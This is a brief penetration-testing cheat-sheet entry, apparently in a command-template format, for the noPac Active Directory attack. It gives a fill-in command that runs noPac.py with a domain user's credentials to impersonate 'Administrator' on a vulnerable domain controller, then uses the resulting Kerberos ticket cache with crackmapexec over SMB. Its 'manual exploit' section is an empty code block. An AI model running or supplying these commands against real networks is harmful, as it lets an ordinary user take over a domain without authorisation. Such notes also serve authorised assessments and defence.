# noPac

## NoPac (exploit)
#assessment/AD #attack_type/Quickwin #port/445 #port/139 #protocol/smb #access/Domain_user 

Exploit noPac on a vulnerable domain controller.
After successful exploit :
    $ cme smb $DC --use-kcache

```bash
noPac.py "<domain>"/"<user>":"<password>" -dc-ip <dc-ip> --impersonate "Administrator" -use-ldap
export KRB5CCNAME=<PATH_TO_CCACHE>
```

## NoPac (manual exploit)
 

Exploit noPac on a vulnerable domain controller.

```bash

```

= dc-ip: $DC_IP
= user: $USER
= password: $PASSWORD
= domain: $DOMAIN
